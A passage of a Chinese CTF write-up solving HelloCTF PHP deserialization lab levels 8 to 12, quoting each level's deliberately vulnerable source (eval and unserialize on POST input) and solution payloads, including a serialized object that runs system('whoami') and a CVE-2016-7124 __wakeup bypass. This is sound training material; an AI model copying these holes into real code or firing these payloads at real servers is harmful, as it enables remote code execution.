class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>serialize() 不会 调用构造或析构函数（除非类实现了 __sleep() 或 __wakeup()），unserialize() 在创建对象时 不会调用构造函数 __construct，$n 是反序列化出来的对象，现在没有其它引用了，被销毁时会立即触发析构函数 __destruct。</p>
<p>总的来说，构造函数只在 new 时调用（序列化、反序列化不触发），析构函数在销毁对象时总会调用（无论对象是 new 的还是 unserialize 的）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Now Your Turn!, Try to get the flag!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析这个代码构造函数被调用时 $flag 强制清零再 +1，但是调用析构函数时 $flag 只是 +1 不会清零。因为序列化反序列化构造的对象时，不会调用构造函数，但是调用析构函数，所以序列化和反序列化几次就行了。</p>
<p>这个 playload 只有第一次 new 的时候调用一次构造函数，之后全是析构函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">RELFLAG</span>()))))))));</span><br></pre></td></tr></table></figure>

<p>1 次 new ，4 次序列化和反序列化，1 次脚本结束，正好 6 次</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754812123488-72271955-d59f-4043-b933-da1c791876b9.png"></p>
<h1 id="Level-9-构造函数的后门"><a href="#Level-9-构造函数的后门" class="headerlink" title="Level-9 : 构造函数的后门"></a>Level-9 : 构造函数的后门</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 9 : 构造函数的后门 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：似曾相识</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;HelloCTF&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>由于反序列化之后会调用析构函数，所以直接写 exp 就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_command</span> = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure>

<p>这就 rce 了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754813959454-8bf6a2d2-0553-423e-b6f0-d1e87a95f913.png"></p>
<h1 id="Level10-weakup"><a href="#Level10-weakup" class="headerlink" title="Level10 : weakup!"></a>Level10 : weakup!</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 10 : weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span></span><br><span class="line"><span class="comment">除开构造和析构函数，这应该是你第一个真正意义上开始接触的魔术方法，此后每一个魔术方法对应的题目我都会在这里介绍。</span></span><br><span class="line"><span class="comment">当然你也可以直接查阅PHP官网文档 - 魔术方法部分：https://www.php.net/manual/zh/language.oop5.magic.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
<p>所以这道题的解题思路是直接就是序列化 Flag 这个类，之后进行反序列化触发 __wakeup 魔术方法就行了。</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756089206181-180d1988-55f1-477c-b907-5754eb33f157.png"></p>
<h1 id="Level11-Bypass-weakup"><a href="#Level11-Bypass-weakup" class="headerlink" title="Level11 : Bypass weakup!"></a>Level11 : Bypass weakup!</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 11 : Bypass weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-7124 - PHP5 &lt; 5.6.25 / PHP7 &lt; 7.0.10</span></span><br><span class="line"><span class="comment">在该漏洞中，当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前提： CVE-2016-7124 - PHP5 &lt; 5.6.25 &#x2F; PHP7 &lt; 7.0.10</p>
<p>在该漏洞中，当序列化字符串中对象属性的值大于真实属性值时便会跳过__wakeup的执行。</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;REALFLAG&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：O:4:&quot;FLAG&quot;:1:&#123;s:4:&quot;flag&quot;;s:8:&quot;REALFLAG&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>之后把 O:4:”FLAG”:<strong><font style="color:#DF2A3F;">1</font></strong>:{s:4:”flag”;s:8:”REALFLAG”;} 中的“ 1 ”改成比 1 大的数就行了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756091001406-49c34864-81c7-469f-886a-8e2c239693fd.png"></p>
<h1 id="Level12-sleep"><a href="#Level12-sleep" class="headerlink" title="Level12 : sleep!"></a>Level12 : sleep!</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 12 : sleep! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">年轻就是好啊，倒头就睡。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</span></span><br><span class="line"><span class="comment">该方法必须返回一个数组: return array(&#x27;属性1&#x27;, &#x27;属性2&#x27;, &#x27;属性3&#x27;) / return [&#x27;属性1&#x27;, &#x27;属性2&#x27;, &#x27;属性3&#x27;]。</span></span><br><span class="line"><span class="comment">数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。</span></span><br><span class="line"><span class="comment">如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - %00父类名称%00变量名 (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 &quot;\0&quot; - 注意在双引号中，PHP 才会解析转义字符和变量。)。</span></span><br><span class="line"><span class="comment">例如，父类 FLAG 的私有属性 private $f; 应该在子类的 __sleep() 方法中以 &quot;\0FLAG\0f&quot; 的格式返回。</span></span><br><span class="line"><span class="comment">如果该方法未返回任何内容，序列化会被制空，并产生一个 E_NOTICE 级别的错误。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$l</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$g</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CHALLENGE</span> <span class="keyword">extends</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$l</span>,<span class="variable">$I</span>,<span class="variable">$o</span>,<span class="variable">$c</span>,<span class="variable">$t</span>,<span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">chance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */</span></span><br><span class="line">        <span class="variable">$array_list</span> = [<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">        <span class="variable">$_</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);<span class="variable">$__</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$array_list</span>[<span class="variable">$_</span>],<span class="variable">$array_list</span>[<span class="variable">$__</span>],<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">chance</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CHALLENGE</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If you serialize FLAG, you will just get x,y,z</span></span><br><span class="line"><span class="comment">O:4:&quot;FLAG&quot;:3:&#123;s:1:&quot;x&quot;;N;s:1:&quot;y&quot;;N;s:1:&quot;z&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">------ 每次请求会随机返回两个属性，你也可以用 chance 来指定你想要的属性 ------</span></span><br><span class="line"><span class="comment">Now __sleep()&#x27;s return parameters is array(&#x27;e&#x27;,&#x27;l&#x27;,&#x27;you shuold use it&#x27;)</span></span><br><span class="line"><span class="comment">O:9:&quot;CHALLENGE&quot;:3:&#123;s:1:&quot;e&quot;;s:4:&quot;Th3_&quot;;s:1:&quot;l&quot;;s:17:&quot;__sleep_function_&quot;;s:17:&quot;you shuold use it&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</p>
